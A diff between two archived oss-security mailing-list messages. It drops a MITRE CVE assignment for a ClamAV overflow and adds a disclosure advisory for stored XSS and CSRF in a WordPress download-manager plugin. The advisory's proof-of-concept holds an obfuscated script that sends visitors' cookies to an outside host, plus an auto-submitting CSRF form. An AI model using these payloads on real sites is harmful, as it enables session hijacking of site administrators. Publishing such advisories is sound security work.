@@ -1,45 +1,115 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/11/22/1
-Message-Id: <20141122054534.D2012B2E39A@smtpvbsrv1.mitre.org>
-Date: Sat, 22 Nov 2014 00:45:34 -0500 (EST)
-From: cve-assign@...re.org
-To: Damien.Millescamps@...ida.fr
-Cc: cve-assign@...re.org, oss-security@...ts.openwall.com
-Subject: Re: CVE request: heap buffer overflow in ClamAV
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/12/02/4
+Message-ID: <20141202162954.GA32279@kludge.henri.nerv.fi>
+Date: Tue, 2 Dec 2014 18:29:54 +0200
+From: Henri Salo <henri@...v.fi>
+To: oss-security@...ts.openwall.com, bugtraq@...urityfocus.com
+Cc: moderators@...db.org
+Subject: CVE-2014-9129: XSS and CSRF in CM Download Manager plugin for WordPress
 Content-Type: text/plain; charset=utf-8
 
 -----BEGIN PGP SIGNED MESSAGE-----
 Hash: SHA1
 
-> https://bugzilla.clamav.net/show_bug.cgi?id=11155
+Product: WordPress plugin cm-download-manager
+Plugin page: https://wordpress.org/plugins/cm-download-manager/
+Vendor: CreativeMindsSolutions http://cminds.com/
+Vulnerability Type: CWE-79: Cross-site scripting
+Vulnerable Versions: 2.0.6 and below
+Fixed Version: 2.0.7
+Solution Status: Fixed by Vendor
+Vendor Notification: 2014-11-27
+Public Disclosure: 2014-12-02
+CVE Reference: N/A. Only assigned for CSRF
+Criticality: Low
 
-This is apparently not a public bug report at the moment.
+Vulnerability details:
 
-> https://github.com/vrtadmin/clamav-devel/commit/fc3794a54d2affe5770c1f876484a871c783e91e
+CM Download Manager plugin for WordPress contains a flaw that allows a stored
+cross-site scripting (XSS) attack. This flaw exists because the
+/wp-admin/admin.php script does not validate input to the 'addons_title' POST
+parameter before returning it to users. This allows an authenticated remote
+attacker to create a specially crafted request that would execute arbitrary
+script code in a user's browser session within the trust relationship between
+their browser and the server.
 
-It seems possible that this fixed other issues apart from the y0da
-Crypter heap-based buffer overflow.
+Root cause:
 
-> A heap buffer overflow was reported in ClamAV when scanning a
-> specially crafted y0da Crypter obfuscated PE file.
+The software incorrectly neutralizes user-controllable input before it is placed
+in output that is used as a web page that is served to authenticated users.
 
-Use CVE-2014-9050 only for this specific buffer overflow. If any other
-vulnerability was fixed in fc3794a54d2affe5770c1f876484a871c783e91e, it
-would have a different CVE ID.
+Proof-of-concept:
 
-- -- 
-CVE assignment team, MITRE CVE Numbering Authority
-M/S M300
-202 Burlington Road, Bedford, MA 01730 USA
-[ PGP key available through http://cve.mitre.org/cve/request_id.html ]
+Insert following code to CM Downloads -> Settings -> "Downloads listing title"
+field with CSRF attack.
+
+<script>var foo = String.fromCharCode(60, 115, 99, 114, 105, 112, 116, 62, 110,
+101, 119, 32, 73, 109, 97, 103, 101, 40, 41, 46, 115, 114, 99, 61, 34, 104, 116,
+116, 112, 58, 47, 47, 98, 117, 103, 115, 46, 102, 105, 47, 99, 111, 111, 107,
+105, 101, 46, 112, 104, 112, 63, 105, 100, 61, 34, 43, 100, 111, 99, 117, 109,
+101, 110, 116, 46, 99, 111, 111, 107, 105, 101, 59, 60, 47, 115, 99, 114, 105,
+112, 116, 62);document.write(foo);</script>
+
+- ---------------
+Product: WordPress plugin cm-download-manager
+Plugin page: https://wordpress.org/plugins/cm-download-manager/
+Vendor: CreativeMindsSolutions http://cminds.com/
+Vulnerability Type: CWE-352: Cross-Site Request Forgery
+Vulnerable Versions: 2.0.6 and below
+Fixed Version: 2.0.7
+Solution Status: Fixed by Vendor
+Vendor Notification: 2014-11-27
+Public Disclosure: 2014-12-02
+CVE Reference: CVE-2014-9129
+Criticality: Low
+
+Vulnerability details:
+
+CM Download Manager plugin for WordPress contains a flaw on the
+CMDM_admin_settings page as HTTP requests to /wp-admin/admin.php do not
+require multiple steps, explicit confirmation, or a unique token when performing
+sensitive actions. By tricking authenticated user into following a specially
+crafted link, a context-dependent attacker can perform a CSRF attack causing the
+victim to insert and execute arbitrary script code.
+
+Root cause:
+
+The web application does not sufficiently verify whether a well-formed, valid,
+consistent request was intentionally provided by the user who submitted the
+request.
+
+Proof-of-concept:
+
+<html><body><h3>https://example.org/wp-admin/admin.php?page=CMDM_admin_settings</h3>
+<form id="f1" method="POST"
+action="https://example.com/wp-admin/admin.php?page=CMDM_admin_settings">
+<table><input type="text" name="addons_title" value="XSS"></table></form>
+<script type="text/javascript">document.getElementById("f1").submit();</script>
+</body></html>
+
+Notes:
+
+Other pages and/or parameters are also possibly insecure (not tested). Suggested
+to do a proper security audit for their software. Vendor did not mention
+security fix or CVE in ChangeLog even it was discussed several times. References
+below.
+
+Cross-site scripting:
+    http://cwe.mitre.org/data/definitions/79.html
+    https://scapsync.com/cwe/CWE-79
+    https://en.wikipedia.org/wiki/Cross-site_scripting
+
+Cross-Site Request Forgery:
+    http://cwe.mitre.org/data/definitions/352.html
+    https://scapsync.com/cwe/CWE-352 
+    https://en.wikipedia.org/wiki/Cross-site_request_forgery
+
+- ---
+Henri Salo
 -----BEGIN PGP SIGNATURE-----
-Version: GnuPG v1.4.14 (SunOS)
+Version: GnuPG v1.4.12 (GNU/Linux)
 
-iQEcBAEBAgAGBQJUcCKOAAoJEKllVAevmvms5ZwIAL1Azwt2oleqjIProgVYER41
-22eCopXXb77Pk+3mk5BQtf/B6VumKxLtWJVB6AeQW+AwHOXOmRRdDpC6UoqJtvHZ
-UaPy0v5vRSoyWLverIiajD+wvRZb2ukj08dZq7AzNusnQUfhFl/BML0LrUYwZIT7
-Qe/+RFnmpqbPiZ+rsXyMGH25agXX0Lj4gfU0dKwc/Gkqin7+3ukXfOFLxQVjWzUR
-8yBojJav/hHEcblGHMvxU4YUSFP6GdZGRKzrK9Qb3iDhR2r8HuKKfI2AUqeqyWG4
-gjZKBSNtHwNtgoC4J7Q6chtil8tuwRFBqE3xtMIuo0QG5BO9dxRwYK2TvIt0a0U=
-=jlDq
+iEYEARECAAYFAlR96QIACgkQXf6hBi6kbk8peQCgtWgwrqs7ahsAw30Ndnu70N7/
+l98An1m+MqJ7xJ8+VcPbMxo72i1Xs2oT
+=bUVi
 -----END PGP SIGNATURE-----
